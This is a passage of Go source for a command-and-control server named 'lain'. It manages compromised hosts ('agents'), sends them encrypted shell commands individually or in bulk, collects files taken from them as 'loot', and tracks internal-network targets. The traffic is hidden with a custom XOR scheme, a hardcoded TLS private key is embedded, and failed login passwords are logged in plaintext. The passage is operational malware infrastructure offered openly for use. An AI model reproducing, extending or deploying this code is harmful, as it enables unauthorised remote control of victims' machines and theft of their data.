    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    file, err := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    if err != nil {
        log.Printf("unable to open log file: %v\n", err)
        return nil, errors.New("log err")
    }
    defer file.Close()
    logger := log.New(file, "", 0)
    filekey := Get_decry_s(&keyDecry,&key,&uid)
    existingData, exists := DownloadFile_byte_parts[filekey]
    if !exists {
        return nil, errors.New("file not found")
    }
    // 解析 filekey，提取分割大小
    parts := strings.Split(filekey, "*")
    if len(parts) != 3 {
        return nil, errors.New("splitSize missing")
    }
    splitSize, err := strconv.Atoi(parts[2])
    if err != nil || splitSize <= 0 {
        return nil, errors.New("invalid splitSize")
    }
    // 获取当前文件的已分割数量（如果未初始化，则设为 0）
    currentPartsCount, exists := parts_count[filekey]
    if !exists {
        currentPartsCount = 0
    }
    // 计算总分割数量
    totalParts := int(math.Ceil(float64(len(existingData)) / float64(splitSize)))
    if currentPartsCount >= totalParts {
        log_str := fmt.Sprintf("%v Host:[%s] File download successful: [%s]\n", formattedTime, uid, parts[1])
        logger.Println(log_str)
        return nil, nil
    }
    // 计算分块范围
    start := currentPartsCount * splitSize
    end := start + splitSize
    if end > len(existingData) {
        end = len(existingData)
    }
    // 取出当前分块数据
    partData := existingData[start:end]
    // **正确递增已发送分块数**
    parts_count[filekey] = currentPartsCount + 1
    log_str := fmt.Sprintf("%v Host:[%s] File downloading[%s],length:%v,part:%v\n", formattedTime, uid,parts[1],len(partData),currentPartsCount)
    logger.Println(log_str)
    return partData, nil
}


// 上传文件处理
func UploadFileHandler(uid,data string,header *multipart.FileHeader, file multipart.File){
    // 检查 UID 是否有效
    key, exists := key_map[uid]
    if !exists {
        return
    }
    key_part := []byte(key)
    decry_data := Get_decry_s(&data,&key,&uid)
    data_list := strings.Split(decry_data,"^")
    username := data_list[0]
    splitSize := data_list[1]
    fileSize := data_list[2]
    start := data_list[3]
    end := data_list[4]
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    logFile, _ := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
    defer logFile.Close()
    log.SetOutput(logFile)
    fileLog := fmt.Sprintf("%v A request to upload a file has been received", formattedTime)
    log.Println(fileLog)
    splitPos,_ := strconv.Atoi(splitSize)
    filePos, _ := strconv.Atoi(fileSize)
    startPos, _ := strconv.Atoi(start)
    endPos, _ := strconv.Atoi(end)
    // 缓存文件块
    var buffer bytes.Buffer
    _, err := io.Copy(&buffer, file)
    if err != nil {
        return
    }
    fileData := buffer.Bytes()
    log.Printf("Received file chunk: %s, size: %dMB", header.Filename, len(fileData)/(1024*1024))
    // 拼接文件名
    receivedFilePath := "./uploads/" + uid + "/" + header.Filename
    dirPath := filepath.Dir(receivedFilePath)
    // 检查目录是否存在
    if _, err := os.Stat(dirPath); os.IsNotExist(err) {
        // 如果目录不存在，则创建
        err := os.MkdirAll(dirPath, 0755)
        if err != nil {
            return
        }
    }
    // 将文件块保存到全局变量
    file_key := uid + "=" + header.Filename
    mutex.Lock()
    if existingData, exists := UploadFile_byte_parts[file_key]; exists {
        // 如果存在已经保存的部分，将当前的分段追加到之前的字节流中
        UploadFile_byte_parts[file_key] = append(existingData, fileData...)
    } else {
        // 如果没有保存该文件的分段，则保存当前分段
        UploadFile_byte_parts[file_key] = fileData
    }
    mutex.Unlock()
    // 判断是否是最后一段，如果是，合并所有分段并解密
    if endPos == filePos {
        // 解密文件
        err := decryptFile(file_key,receivedFilePath,uid,key_part)
        if err != nil {
            return
        }
        // 解密后清空全局变量中的文件数据
        delete(UploadFile_byte_parts, file_key)
    }
    log.Printf("%v ==== Received from user: %s, UID: %s, File: %s, Parts: %v, Range: %d-%d\n",
        formattedTime, username, uid, header.Filename, splitPos/(1024*1024), startPos/(1024*1024), endPos/(1024*1024))
}
// 解密文件
func decryptFile(receivedFile,receivedFilePath,uid string, key []byte) error {
    // 创建文件
    outputFile, err := os.Create(receivedFilePath)
    if err != nil {
        return err
    }
    defer outputFile.Close()
    // 调用解密函数
    err = Get_encry_f(receivedFile,uid, outputFile, key)
    if err != nil {
        return err
    }
    return nil
}

//写入目录列表
func Put_file_list(uid,file string) {
	_,exists := key_map[uid]
	if exists{
		mutex.Lock()
		file_list[uid] = file
		mutex.Unlock()
	}
}

//读取文件列表
func Get_file_list(uid string)string{
	mutex.Lock()
	key, exists1 := key_map[uid]
	file,exists2:= file_list[uid]
	if exists1 && exists2 {
		mutex.Unlock()
		delete(file_list,uid)
		decryptedData:= Get_decry_s(&file, &key,&uid)
        return decryptedData
	} else {
		mutex.Unlock() 
        return ""
	}
}

func Log_read() ([]string, error) {
    file, err := os.Open("lain.log")
    if err != nil {
        return nil, fmt.Errorf("log file in empty: %v", err)
    }
    defer file.Close()
    const maxLines = 50
    lines := make([]string, 0, maxLines)
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, scanner.Text())
        if len(lines) > maxLines {
            lines = lines[1:] // 保持队列大小不超过 maxLines
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, fmt.Errorf("log file error: %v", err)
    }
    return lines, nil
}

//获取用户所有战利品
func Get_loots(username string, w http.ResponseWriter, r *http.Request) {
    shell_list := []string{}
    for i, client := range client_data.Clients {
        if username == "lain" {
            // 查询所有主机
            shell_list = append(shell_list, client.Uid)
        } else if username == client.Username {
            // 查询用户所拥有的主机
            shell_list = append(shell_list, client_data.Clients[i].Uid)
        }
    }
    if len(shell_list) == 0 {
        http.Error(w, error_str, http.StatusNotFound)
        return
    }
    // 构建HTML响应
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprintf(w, `<html><body><h2>User %s loot</h2><ul>`, username)
    for _, uid := range shell_list {
        // 构造用户 UID 目录路径
        dirPath := filepath.Join("uploads", uid)
        // 检查目录是否存在
        if _, err := os.Stat(dirPath); os.IsNotExist(err) {
            continue
        }
        // 读取该 UID 目录中的文件
        files, err := os.ReadDir(dirPath)
        if err != nil {
            http.Error(w, error_str, http.StatusInternalServerError)
            return
        }
        fmt.Fprintf(w, `<li><strong>UID: %s</strong><ul>`, uid)
        for _, file := range files {
            if !file.IsDir() {
                fileName := file.Name()
                // 构造下载路径，直接指向 uploads 目录
                filePath := fmt.Sprintf("/uploads/%s/%s", uid, fileName)
                fmt.Fprintf(w, `<li>📄 %s <a href="%s" class="icon-download" style="cursor: pointer;">⬇️</a></li>`, fileName, filePath)
            }
        }
        fmt.Fprintf(w, `</ul></li>`)
    }
    fmt.Fprintf(w, `</ul></body></html>`)
}

//前端上传文件
func UserUploadFile(uid, filename, splitSize string, fileContent []byte) (string, error) {
    key, exists := key_map[uid]
    if !exists {
        return "", fmt.Errorf("uid does not exist")
    }
    splitPos,_:=strconv.Atoi(splitSize)
    if splitPos <= 0{
        splitSize = "1048576"
    }
    // 调用加密函数对文件加密
    encryptedFileContent, err := Get_decry_f(&fileContent, &key,&uid) // 直接获取加密后的字节流
    if err != nil {
        return "", fmt.Errorf("encryption error: %v", err)
    }
    // 将加密后的文件字节流存入全局变量
    file_key := uid + "*" + filename + "*" + splitSize
    DownloadFile_byte_parts[file_key] = encryptedFileContent
    // 返回加密后的文件内容作为字符串（如果需要的话）
    return string(encryptedFileContent), nil
}


//集体指令
func getAll(username,cmd,osType string){
	for i,client := range client_data.Clients{
		if username == client.Username{
			if osType == client_data.Clients[i].OS{
				mutex.Lock()
				key, exists := key_map[client.Uid]
				if exists {
					encryptedCmd := Get_encry_s(&cmd, &key,&client_data.Clients[i].Uid)
					shell_get[client.Uid] = encryptedCmd
					mutex.Unlock()
				}
			}
		}
	}
}

func Get_Clients(username string) (map[string]string, error) {
    shell_list := make(map[string]string)
    // 遍历客户端数据
    for _, client := range client_data.Clients {
        if username == client.Username {
            shell_list[client.Uid] = client.Host
        }
    }
    if len(shell_list) == 0 {
        return nil, fmt.Errorf("no clients found for username: %s", username)
    }
    return shell_list, nil
}

//查询内网资产
func getInnet(uid string,w http.ResponseWriter) {
	var list_innet []Innet
	for _, innet := range data_innet.Innets {
		if uid == innet.Uid {
			list_innet = append(list_innet, innet)
		}
	}
	jsonData, err := json.Marshal(list_innet)
	if err != nil {
		http.Error(w,"json error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)
}
// 加密函数
func EncryptDecrypt(input []byte, key []byte,uid string) []byte {
	if len(input) == 0 {
		return nil
	}
	var result []byte
	startIndex := 0
	for i := 1; i <= len(key); i++ {
		if len(input) <= keyPartArr[uid][i%len(keyPartArr[uid])] {
			startIndex = int(key[keyPartArr[uid][i%len(keyPartArr[uid])]%len(key)]) % len(key)
			break
		}else if len(input) >=  keyPartArr[uid][i%len(keyPartArr)] {
			startIndex = len(key) % int(key[keyPartArr[uid][i%len(keyPartArr[uid])]%len(key)]) 
            break
		}
	}
	for i, b := range input {
		key_ := key[(startIndex+i)%len(key)]
		result = append(result, b^key_)
	}
	return result
}

// 加密文件
func Get_decry_f(data *[]byte, key,uid *string) ([]byte, error) {
    encrypted := EncryptDecrypt(*data, []byte(*key),*uid)
    return encrypted, nil
}
// 解密文件，处理加密字节流，解密后写入 outputFile
func Get_encry_f(encryptedkey,uid string, outputFile *os.File, key []byte) error {
    decrypted := EncryptDecrypt(UploadFile_byte_parts[encryptedkey], key,uid)
    _, err := outputFile.Write(decrypted)
    if err != nil {
        return err
    }
    return nil
}

// 加密字符串（Base64）
func Get_encry_s(input, key,uid *string) string {
	// 调用加密函数
	encryptedBytes := EncryptDecrypt([]byte(*input), []byte(*key),*uid)
	// 使用 Base64 进行编码
	return base64.URLEncoding.EncodeToString(encryptedBytes)
}

// 解密字符串（Base64）
func Get_decry_s(input, key,uid *string) string {
	// Base64 解码
	decodedBytes, err := base64.URLEncoding.DecodeString(*input)
	if err != nil {
		fmt.Println("Base64 解码失败:", err)
		return ""
	}
	// 调用解密函数恢复原始数据
	decryptedBytes := EncryptDecrypt(decodedBytes, []byte(*key),*uid)
	return string(decryptedBytes)
}


/*结构体数据部分*/

//用户结构体
type User struct{
	Username    string `json:"username"`
	Password    string   `json:"password"`
}
type Data_user struct{
	Users []User `json:"users"`
}
var data_user Data_user

//主机结构体
type Client struct {
	Username    string `json:"username"`
	Host        string `json:"host"`
	OS          string `json:"os"`
	Delay        int    `json:"Delay"`
	OnlineTime  string `json:"online_time"`
	ExternalIP     string `json:"external_ip"`
	LocalIP     string `json:"local_ip"`
	CurrentDir  string `json:"currentDir"`
	version     string `json:"version"`
	Remarks     string `json:"Remarks"`
	checkTime   string `json:"checkTime"`
	Uid         string `json:"uid"`
}
type Data struct {
	Clients []Client `json:"clients"`
}
var client_data Data

//get_conn结构体
type getConn struct{
	Username    string `json:"username"`
	Host        string `json:"host"`
	OnlineTime  string `json:"online_time"`
	HostKey     string `json:"host_key"`
	ShellIP     string `json:"shell_ip"`
	Uid         string `json:"uid"`
}
type Data_conn struct {
	Conns []getConn `json:"conns"`
}
var data_conn Data_conn

//内网资产结构体
type Innet struct {
    Uid    string   `json:"Uid"`
    IP           string   `json:"ip"`
    Target       string   `json:"target"`
    ShellInnet   []string `json:"shell_innet"`
}

type DataInnet struct {
    Innets []Innet `json:"innets"`
}
var data_innet DataInnet

func put_innet(uid, target string, shell_innet []string) {
    var IP string
    for _, client := range client_data.Clients {
        if uid == client.Uid {
            IP = client.ExternalIP
            break
        }
    }
    // 查找是否已有匹配的 Innet
    found := false
    for i, innet := range data_innet.Innets {
        if uid == innet.Uid && target == innet.Target {
            found = true
            for _, v := range shell_innet {
                if !contains(innet.ShellInnet, v) {
                    data_innet.Innets[i].ShellInnet = append(data_innet.Innets[i].ShellInnet, v)
                }
            }
            break
        }
    }
    // 如果没有找到，追加新的 Innet
    if !found {
        newInnet := Innet{
            Uid:  uid,
            IP:         IP,
            Target:     target,
            ShellInnet: shell_innet,
        }
        data_innet.Innets = append(data_innet.Innets, newInnet)
    }
}

// 辅助函数：检查切片中是否包含某个字符串
func contains(slice []string, item string) bool {
    for _, v := range slice {
        if v == item {
            return true
        }
    }
    return false
}

//写入链接结构体
func put_conn(username, host, online_time,uid,shell_ip,host_key string){
	newConn := getConn{
        Username:   username,
        Host:       host,
        OnlineTime: online_time,
		HostKey:    host_key,
        ShellIP:    shell_ip,
		Uid:		uid,
    }
	for _,conn := range data_conn.Conns{
		if username == conn.Username && uid == conn.Uid{
			return
		}
	}
    data_conn.Conns = append(data_conn.Conns, newConn)
	log_str := fmt.Sprintf("%v Request from user:%v,IP:%v,Host:%v,uid:%v",online_time, username, shell_ip, host,uid)
	// 打开日志文件
	file, err := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		return
	}
	defer file.Close()
	log.SetOutput(file)
	log.Println(log_str)
}

// 写入主机结构体
func put_client(username, host, osType, online_time, shell_ip,currentDir,version,innet_ip,Remarks,uid string, _delay int) {
    newClient := Client{
        Username:   username,
        Host:       host,
        OS:         osType,
        Delay:       _delay,
        OnlineTime: online_time,
        ExternalIP:    shell_ip,
		LocalIP:    innet_ip,
		CurrentDir: currentDir,
		version:    version,
		Remarks:    Remarks,
		Uid:         uid,
    }
	for i,client := range client_data.Clients{
		if username == client.Username && host == client.Host && uid == client.Uid{
			client_data.Clients[i].OnlineTime = online_time
			client_data.Clients[i].ExternalIP = shell_ip
			client_data.Clients[i].LocalIP = innet_ip
			client_data.Clients[i].Delay = _delay
			client_data.Clients[i].CurrentDir = currentDir
			client_data.Clients[i].version = version
			client_data.Clients[i].Remarks = Remarks
			client_data.Clients[i].checkTime = online_time
			return
		}
	}
    client_data.Clients = append(client_data.Clients, newClient)
}

//获取主机结构体
func get_struct[T any](file_json string) ([]T, error) {
	// 打开 JSON 文件
	file, err := os.Open(file_json)
	if err != nil {
		return nil, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	// 读取文件内容
	byteValue, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read file content: %v", err)
	}

	// 检查类型 T 并根据文件结构解析 JSON 数据
	switch any(*new(T)).(type) {
	case User:
		var data Data_user
		err = json.Unmarshal(byteValue, &data)
		if err != nil {
			return nil, fmt.Errorf("Failed to parse JSON data: %v", err)
		}
		result := make([]T, len(data.Users))
		for i, v := range data.Users {
			result[i] = any(v).(T)
		}
		return result, nil
	case Client:
		var data Data
		err = json.Unmarshal(byteValue, &data)
		if err != nil {
			return nil, fmt.Errorf("Failed to parse JSON data: %v", err)
		}
		result := make([]T, len(data.Clients))
		for i, v := range data.Clients {
			result[i] = any(v).(T)
		}
		return result, nil
	case getConn:
		var data Data_conn
		err = json.Unmarshal(byteValue, &data)
		if err != nil {
			return nil, fmt.Errorf("Failed to parse JSON data: %v", err)
		}
		result := make([]T, len(data.Conns))
		for i, v := range data.Conns {
			result[i] = any(v).(T)
		}
		return result, nil
	default:
		return nil, fmt.Errorf("Unsupported types: %T", *new(T))
	}
}

//读取结构体
func readJSONFile(fileName string, v interface{}) error {
    file, err := os.OpenFile(fileName, os.O_RDWR|os.O_CREATE, 0644)
    if err != nil {
        return fmt.Errorf("could not open file: %v", err)
    }
    defer file.Close()

    byteValue, err := ioutil.ReadAll(file)
    if err != nil {
        return fmt.Errorf("Failed to read file content: %v", err)
    }

    if len(byteValue) > 0 {
        err = json.Unmarshal(byteValue, v)
        if err != nil {
            return fmt.Errorf("Failed to parse JSON data: %v", err)
        }
    }

    return nil
}

//写入结构体
func writeJSONFile(fileName string, v interface{}) error {
    updatedByteValue, err := json.MarshalIndent(v, "", "    ")
    if err != nil {
        return fmt.Errorf("JSON Serialization failed: %v", err)
    }

    err = ioutil.WriteFile(fileName, updatedByteValue, 0644)
    if err != nil {
        return fmt.Errorf("Writing back to file failed: %v", err)
    }

    return nil
}

/*结构体数据部分结束*/


// 预定义的默认证书和私钥（硬编码）
const defaultCert = `-----BEGIN CERTIFICATE-----
MIIDUTCCAjmgAwIBAgIUWx+LBRe2XIDAod8XpYH2JoyjuhYwDQYJKoZIhvcNAQEF
BQAwNTESMBAGA1UEAwwJMTI3LjAuMC4xMRIwEAYDVQQKDAkxMjcuMC4wLjExCzAJ
BgNVBAYTAkhLMB4XDTI0MDYzMDE2NTAwMFoXDTI0MDcxOTA2MDAwMFowcTELMAkG
A1UEBhMCS0gxEjAQBgNVBAgMCTEyNy4wLjAuMTESMBAGA1UEBwwJMTI3LjAuMC4x
MRIwEAYDVQQKDAkxMjcuMC4wLjExEjAQBgNVBAsMCTEyNy4wLjAuMTESMBAGA1UE
AwwJMTI3LjAuMC4xMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0WJS
cHsNxNiICwnTu4swyVas1V47NFN+yS90TJx8synK47GH2vywusxJYR4KtOG1+ARW
qQSw85ZQ9sG9b/pjeXuyI8QECccVcy+IWPHgv11zv6O7dfr2q8Jvkla6klSlozB2
8ClLEpJpIi+GA14FAngOMKhfQ15GIAXfmhTjEg13pTBkm0dKzTMfIDUE7Wkm1FAH
yDqioSko1+aqajpLS4/+U2mNLVmeK+fvnxumK9PWpE9IrSSEIIekVff1wi6geyOJ
MJjy6+MHSkArA0Xlm2ZMr91WTVA7KRWZn3B9c+b7L1gvgyD+9J7W2nDDvOD8hsCi
ClonNnxG6ZNybCJ4rQIDAQABox0wGzALBgNVHREEBDACggAwDAYDVR0TAQH/BAIw
ADANBgkqhkiG9w0BAQUFAAOCAQEAuiIrcHNb3bOllEmwIGmTDd3LONkff2IfkIfF
6y3dtw3YCGThppYOi+TyM3yCwIVhO/PRWqjD9OK+3eyhDA3ws+GlCdUHHKwq7eaR
ZqISUJGZb2dweJtJlK58MQcw2XT6o0XRmi7d+BcSprl25X0qJ5Zm7aOr1rgqs+e9
NtuR3TFIsCcvbP95e78yOfMGgc4HPcoXU1Dm+9ChuZTRbL/N9M6lM8TESqri/Rci
oj5MRRVicjuMshrEAOebOSABB/sQzGx6qD50ebxvtBWL76TFZgl8W/+9m6U69RGV
mwFmyhj9ezM5PHIPlQTY8Epyt33S4vo8dG2u+hN7uOx637Jc8A==
-----END CERTIFICATE-----`

const defaultKey = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDRYlJwew3E2IgL
CdO7izDJVqzVXjs0U37JL3RMnHyzKcrjsYfa/LC6zElhHgq04bX4BFapBLDzllD2
wb1v+mN5e7IjxAQJxxVzL4hY8eC/XXO/o7t1+varwm+SVrqSVKWjMHbwKUsSkmki
L4YDXgUCeA4wqF9DXkYgBd+aFOMSDXelMGSbR0rNMx8gNQTtaSbUUAfIOqKhKSjX
5qpqOktLj/5TaY0tWZ4r5++fG6Yr09akT0itJIQgh6RV9/XCLqB7I4kwmPLr4wdK
QCsDReWbZkyv3VZNUDspFZmfcH1z5vsvWC+DIP70ntbacMO84PyGwKIKWic2fEbp
k3JsInitAgMBAAECggEBAJH4wtJp51J5RnazlinkQtHKnFlwBURYhUZK0ABtBD5/
f1O3u6e+jJLdwrZzFDHAPXU3yRayD47yF2W/8Yp0fA8AXlOy3sHWSizwUVT4459l
zkEnK5R3rqpVtiTGU/GaE5OuQOzzTMQY0DSl/v6v+DwdaH8hkrBLtAW1MoqfzyIQ
gEf0Kw5E6WJ8Xr5sGzPPUkZohPwhnLVDssKWWxsKl4ajMKh2XWKEzjY+++9ansni
IVqQG1Em3sWJe6G0xl8FmRhJZZa+h9+lbOCBdpggZlX+Et+E4VilV7UL/VqYscMj
P2EUZ0DcfLbBOiygPSDOCgkJmZDRyKMMWw+Os/oRDeECgYEA80aEUs3/t7bISrea
Y62nqBhzg1FsTQn3akzEEnTWRcf+9tVXpIMGZi2VBGhcJg8z6L636e4Vmb105Xi8
w1T6OSpu+A3jdnrsGeqZt4yDqiQQu+Zgz0KhAr5R2F+JGcX2gbDBDRRMLFZiWNJW
DqoNH9ElLSzqyggfA6yomjp1trUCgYEA3FX++/EVZSgf3VR0xCglpPWuUVOZLypN
KP7EAPg40vYj6bEHrx3WZmXlZk0EavIy0Z02pmtyoPYyrqog8i691IPDfRqM1ncc
By0heNyq/PBgLbiPlCwl3TDY3XgaSTHNeYgpY+0TgziI5vTEBe0Pz4OAMxw6HA03
ZuKnGwvAvRkCgYBYwxn0vITZGy/pUyRZyjqp8oHzH/pMAZ7sgiXoNgkYXOiCV0Ur
GUN0dJ0yhoFYwaNHAI9KIzxuY9oLAAqfmpnR0dG7YBXmXONYcWi0t+gyZAZXCK+5
762fuqFSOUlkxf4zQ7KsewNwCfTIQ7Zyk0lGmqDd4s2n+V6XkJ/T5hCdIQKBgAvM
GvP4a5HX/STHodzi3Wkgsm2uUTRiSnFYerwmjjxVa4TWsregnFstN4QruYHUZ/4r
McLlW+TcachKWas973ISgAQRyNqu0/RaaUFkZ09Vu4CXMjDX0Eswk1wAUz/6B6tr
K/QqvHG5NDNRhbFfiQouW03hRAc+eenrVtEu5un5AoGBAO1QJWVxAoow7/fFcDpF
bYFbWeqQ73i5FK+1b1OZ41gDZsW++HRNx98DNBhNsdgXVbBsjmY3DfrcFDbyMacd
MumxXRIRd2XCtoVubxw2fl453fO+y4K1CZwHi3wrUSrfpP7J1rM7NA7mg6uSJHIT
Wfsk2JnY8xZGSSCLPIqNBOe9
-----END PRIVATE KEY-----`

func main() {
	asciiArt := `
				..                .
			x .d88'                @88>
....		5888R                 %8P      u. u@88u.
			'888R         u      88u     x@88k u@88c.
	.....	888R      us888u.   .@88u  ^'8888''8888'
			888R   .@88 '8888' ''888E'   8888  888R
			888R   9888  9888    888E    8888  888R  ........
			888R   9888  9888    888E    8888  888R
			888R   9888  9888    888E    8888  888R
			.888B . 9888  9888    888&   '*88*' 8888'            ......
			^*888%  '888*''888'   R888'    ''   'Y'      ......          .....  ...₵Ø₦₦Ɇ₵₮ ɆVɆⱤ₮Ⱨł₦₲...
			'%     ^Y'   ^Y'     ''                      
		`
	// 查询用户结构体
	user_err := readJSONFile("user.json", &data_user)
	if user_err != nil {
		fmt.Println("Failed to read user data")
	}

	var port string
    var certPath string
    var keyPath string
    var useDefaultCert bool
    var protocol string
    var conn bool
    var Connect string
    var css_file string

    // 读取命令行参数
    flag.StringVar(&port, "p", "80", "Select Port")
    flag.StringVar(&certPath, "cert", "", "Customize public key path")
    flag.StringVar(&keyPath, "key", "", "Customize private key path")
    flag.BoolVar(&useDefaultCert, "DefaultCert", false, "Use default public and private keys")
    flag.StringVar(&protocol, "protocol", "http", "Select Protocol(http、https)")
    flag.StringVar(&error_str, "resp-error", "error", "web error resp")
    flag.StringVar(&css_file, "css","", "Use default css file")
    flag.BoolVar(&conn, "conn", false, "Use keep alive connection, if this parameter is not present by default, it will be short connection")
    flag.Parse()
    if conn {
        Connect = "keep-alive"  // 如果有 --conn 参数，则启用长连接
    } else {
        Connect = "close"  // 默认是短连接
    }


	// 提供静态文件服务
	if _, err := os.Stat("./html"); os.IsNotExist(err) {
		err := os.MkdirAll("./html", os.ModePerm)
		if err != nil {
			fmt.Println("[*] Unable to create directory ./html:", err)
			return
		}
		fmt.Println("[*] directory ./html Created successfully")
	}
	fs := http.FileServer(http.Dir("./html"))
	http.Handle("/", fs)
	http.Handle("/uploads/", http.StripPrefix("/uploads", http.FileServer(http.Dir("./uploads"))))
	fmt.Println(asciiArt)

	//登录
	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		login().ServeHTTP(w, r)
	})

	http.HandleFunc("/lain", func(w http.ResponseWriter, r *http.Request) {
		lain().ServeHTTP(w, r)
	})

	//文件前端
	http.HandleFunc("/fileHtml", func(w http.ResponseWriter, r *http.Request) {
		file_html().ServeHTTP(w, r)
	})

	//cmd前端
	http.HandleFunc("/cmdHtml", func(w http.ResponseWriter, r *http.Request) {
		cmd_html().ServeHTTP(w, r)
	})

	//无权限交互
	http.HandleFunc("/index.php", func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Connection", Connect)
		Index().ServeHTTP(w, r)
	})
	
	//有权限交互
	http.HandleFunc("/user_index", func(w http.ResponseWriter, r *http.Request) {
		User_index().ServeHTTP(w, r)
	})

	//调用js
	http.HandleFunc("/lain.js", func(w http.ResponseWriter, r *http.Request) {
		lain_js().ServeHTTP(w, r)
	})

	//调用css
	http.HandleFunc("/lain.css", func(w http.ResponseWriter, r *http.Request) {
		lain_css(css_file).ServeHTTP(w, r)
	})
    var cert tls.Certificate
	var err error
	if protocol == "https" {
		// HTTPS 配置
		if useDefaultCert || (certPath == "" && keyPath == "") {
			cert, err = tls.X509KeyPair([]byte(defaultCert), []byte(defaultKey))
			if err != nil {
				fmt.Printf("Failed to load default certificate: %v\n", err)
				return
			}
		} else if certPath != "" && keyPath != "" {
			cert, err = tls.LoadX509KeyPair(certPath, keyPath)
			if err != nil {
				fmt.Printf("[*] Failed to load custom certificate: %v\n", err)
				return
			}
		} else {
			flag.Usage()
			return
		}

		// 自定义 TLS 配置
		tlsConfig := &tls.Config{
			MinVersion:       tls.VersionTLS12,
			GetCertificate:   func(chi *tls.ClientHelloInfo) (*tls.Certificate, error) { return &cert, nil },
			ClientAuth:       tls.NoClientCert,
			InsecureSkipVerify: true,
		}

		// 创建 HTTPS Server
		server := &http.Server{
			Addr:         ":" + port,
			Handler:      http.DefaultServeMux,
			IdleTimeout:  0,
			ReadTimeout:  30 * time.Second,
			WriteTimeout: 30 * time.Second,
			TLSConfig:    tlsConfig,
		}
		fmt.Printf("[*] Start server successful, access address %s://localhost:%s/login\n", protocol, port)
		err = server.ListenAndServeTLS("", "")
		if err != nil {
			fmt.Printf("FAIL TO START %v\n", err)
		}
	} else {
		// HTTP 配置，使用自定义的 Transport
		server := &http.Server{
			Addr:         ":" + port,
			Handler:      http.DefaultServeMux,
			IdleTimeout:  0,
			ReadTimeout:  30 * time.Second,
			WriteTimeout: 30 * time.Second,
		}
		fmt.Printf("[*] Start server successful, access address %s://localhost:%s/login\n", protocol, port)
		err = server.ListenAndServe()
		if err != nil {
			fmt.Printf("FAIL TO START %v\n", err)
		}
	}
}

func generateRandomString(length int) string {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		log.Fatal(err)
	}
	return hex.EncodeToString(bytes)
}
/*登录*/
func login() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport" content="width=device-width, initial-scale=1.0">
				<title>lain</title>
				<link rel="stylesheet" href="/lain.css">
			</head>
			<body>
				<form class="form-in" action="/login" method="post" enctype="application/x-www-form-urlencoded">  
					<h1>Login</h1>
					<input type="text" name="username" id="username" placeholder="Username" required>
					<input type="password" name="password" placeholder="password" required>
					<button type="submit">Login</button>
				</form>
			</body>
			</html>`
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
		if r.Method == http.MethodPost {
			// 解析表单数据
			err := r.ParseForm()
			if err != nil {
				http.Error(w, error_str, http.StatusInternalServerError)
				return
			}

			username := r.FormValue("username")
			password := r.FormValue("password")
            userip := getClientIP(r)

            hash:=md5.New()
            hash.Write([]byte(password))
            hashBytes := hash.Sum(nil)
            hashString := hex.EncodeToString(hashBytes)

			user_err := readJSONFile("user.json", &data_user)
			if user_err != nil {
				http.Error(w, error_str, http.StatusInternalServerError)
				return
			}
			var validUser bool
			for _, user := range data_user.Users {
				if username == user.Username && hashString[:24] == user.Password[:24]{
                    validUser = true
                    break
				}
			}
			current := time.Now()
			formattedTime := current.Format("2006.01.02 15:04")
			file, _ := os.OpenFile("lain.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
			defer file.Close()

			if validUser {
				// 设置Cookie
                randomValue := generateRandomString(32)
                cookie_value := randomValue+"="+username
				cookie := http.Cookie{
					Name:     "cookie",
					Value:    cookie_value,
					Path:     "/",
					Expires:  time.Now().Add(6 * 30 * 24 * time.Hour), //设置成半年
					HttpOnly: false,                       
				}
                sessionSlice = append(sessionSlice,cookie_value)

				log_str := fmt.Sprintf("%v User login successful, come from %v User:%v", formattedTime, userip, username)
				log.SetOutput(file)
				log.Println(log_str)
				http.SetCookie(w, &cookie)
				http.Redirect(w, r, "/lain", http.StatusFound)
			} else {
				// 没有用户则
				log_str := fmt.Sprintf("%v  User login fail,come from %v Incorrect username or password, User:%v,pass:%v", formattedTime, userip, username,password)
				log.SetOutput(file)
				log.Println(log_str)
                http.Error(w, error_str, http.StatusUnauthorized)
			}
		} else {
			http.Error(w,error_str, http.StatusMethodNotAllowed)
		}
	}
}

//lain
func lain() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            http.Error(w, error_str, http.StatusForbidden)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            http.Error(w,error_str, http.StatusForbidden)
            return
        }
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>lain</title>
    <link rel="stylesheet" href="/lain.css">
	<link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
    <script src="/lain.js"></script>
    <div class="container">
        <div class="sidebar">
			<a href="#" data-target="index">
				📶 Listeners
			</a>
			<a href="#" data-target="userIndex">
                💬 Agents
			</a>
			<a href="#" data-target="net">
